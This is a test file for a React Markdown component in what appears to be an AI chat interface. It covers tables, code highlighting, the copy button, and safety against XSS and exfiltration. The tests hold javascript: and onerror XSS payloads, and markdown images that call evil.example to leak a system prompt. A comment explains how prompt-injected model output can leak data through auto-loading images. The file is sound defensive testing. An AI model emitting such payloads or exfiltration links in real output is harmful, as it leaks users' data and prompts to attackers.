// @vitest-environment jsdom
// GFM markdown + highlight: table/code/link rendering and XSS safety (raw HTML is not rendered).
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, screen, cleanup, fireEvent, waitFor } from '@testing-library/react';
import { Markdown } from '../src/markdown';
import '../src/i18n'; // EN default language so Pre's (copy button) t() calls use the real translation (same pattern as views.test.tsx).

afterEach(() => { cleanup(); vi.restoreAllMocks(); });

describe('Markdown (GFM + highlight)', () => {
  it('GFM table cells render', () => {
    render(<Markdown text={'| name | score |\n|---|---|\n| accuracy | 0.9 |'} />);
    expect(screen.getByText('accuracy')).toBeTruthy();
    expect(screen.getByText('0.9')).toBeTruthy();
    expect(document.querySelector('table')).toBeTruthy();
  });

  it('a fenced code block is highlighted with hljs classes + language label and copy button', () => {
    const { container } = render(<Markdown text={'```ts\nconst x: number = 42;\n```'} />);
    const code = container.querySelector('pre code');
    expect(code?.className).toContain('language-ts');
    expect(container.querySelector('.hljs-keyword')).toBeTruthy(); // 'const' is highlighted
    expect(screen.getByText('ts')).toBeTruthy(); // header language label
    expect(screen.getByTitle('Copy code')).toBeTruthy();
  });

  it('safety: http(s) link opens in a new tab; javascript: link is neutralized; raw HTML is not rendered', () => {
    const { container } = render(
      <Markdown text={'[good](https://gnl.dev) [bad](javascript:alert(1))\n\n<img src=x onerror=alert(1)>'} />,
    );
    const good = screen.getByText('good').closest('a');
    expect(good?.getAttribute('href')).toBe('https://gnl.dev');
    expect(good?.getAttribute('target')).toBe('_blank');
    expect(screen.getByText('bad').closest('a')).toBeNull(); // unsafe scheme → plain text
    expect(container.querySelector('img')).toBeNull(); // no raw HTML
  });

  it('task list and strikethrough (GFM) work', () => {
    const { container } = render(<Markdown text={'- [x] done\n- [ ] pending\n\n~~old~~'} />);
    expect(container.querySelectorAll('input[type="checkbox"]').length).toBe(2);
    expect(container.querySelector('del')).toBeTruthy();
  });
});

// Bug-investigation fix #7: the copy button must not unconditionally show "copied" (false positive)
// without waiting for the clipboard-write RESULT — success only inside .then(), error inside .catch().
describe('Markdown code block copy button (bug investigation #7)', () => {
  const code = '```ts\nconst x = 1;\n```';

  it('clipboard write SUCCEEDS → switches to the success indicator', async () => {
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: vi.fn(async () => {}) },
      configurable: true,
    });
    const { container } = render(<Markdown text={code} />);
    fireEvent.click(screen.getByTitle('Copy code'));
    await waitFor(() => expect(container.querySelector('.lucide-check')).toBeTruthy());
  });

  it('clipboard write FAILS (rejected promise) → does not show a false positive, switches to the error indicator', async () => {
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: vi.fn(async () => { throw new Error('permission denied'); }) },
      configurable: true,
    });
    render(<Markdown text={code} />);
    fireEvent.click(screen.getByTitle('Copy code'));
    await waitFor(() => expect(screen.getByTitle(/Couldn't copy/)).toBeTruthy());
  });

  it('when the clipboard API does not exist at all (unsupported), does not unconditionally show "success"', async () => {
    Object.defineProperty(navigator, 'clipboard', { value: undefined, configurable: true });
    render(<Markdown text={code} />);
    fireEvent.click(screen.getByTitle('Copy code'));
    await waitFor(() => expect(screen.getByTitle(/Couldn't copy/)).toBeTruthy());
  });
});

// The text rendered here is the MODEL's, and a model that has read a tool result, a document or a
// web page has been handed text an attacker may have written. An image is the one markdown construct
// that reaches out on its own — no click, no consent — so `![](https://x/?q=<data>)` was an
// exfiltration channel: not for the token, which never enters the DOM, but for anything the model can
// put in a URL, plus the operator's IP and the moment they opened the page.
//
// The link handler had a scheme allow-list from the start. This is the same class with the safety
// inverted, and the protection had gone to the channel that needs a click.
describe('Markdown does not let the model make requests', () => {
  it('a remote image is shown as text, not fetched', () => {
    const { container } = render(<Markdown text={'![x](https://evil.example/b.png?leak=SYSTEM_PROMPT)'} />);
    expect(container.querySelector('img'), 'an <img> here IS the request').toBeNull();
    // Nothing is hidden from the operator. This used to assert the ALT text was present, which is true
    // Whether or not the address is shown — and with an alt present the address was in fact dropped.
    expect(container.querySelector('[title]')?.getAttribute('title')).toBe('https://evil.example/b.png?leak=SYSTEM_PROMPT');
  });

  // No image element is produced at all, and that is deliberate rather than blunt: react-markdown's
  // Own sanitizer strips `data:` before this component runs (measured — the src arrives as ''), so a
  // Branch permitting inline data images would read as a live allowance while never firing.
  it('shows the address even when an alt is present — the common case', () => {
    const { container } = render(<Markdown text={'![chart](https://evil.example/b.png?leak=DATA)'} />);
    expect(container.textContent).toContain('chart');
    expect(container.querySelector('[title]')?.getAttribute('title')).toContain('evil.example');
  });

  it('renders no <img> at all — everything reaching the handler is remote', () => {
    for (const md of ['![y](data:image/png;base64,AAA)', '![z](data:text/html;base64,PHNjcmlwdD4=)', '![w](https://e.example/x.png)']) {
      const { container } = render(<Markdown text={md} />);
      expect(container.querySelector('img'), md).toBeNull();
      cleanup();
    }
  });
});
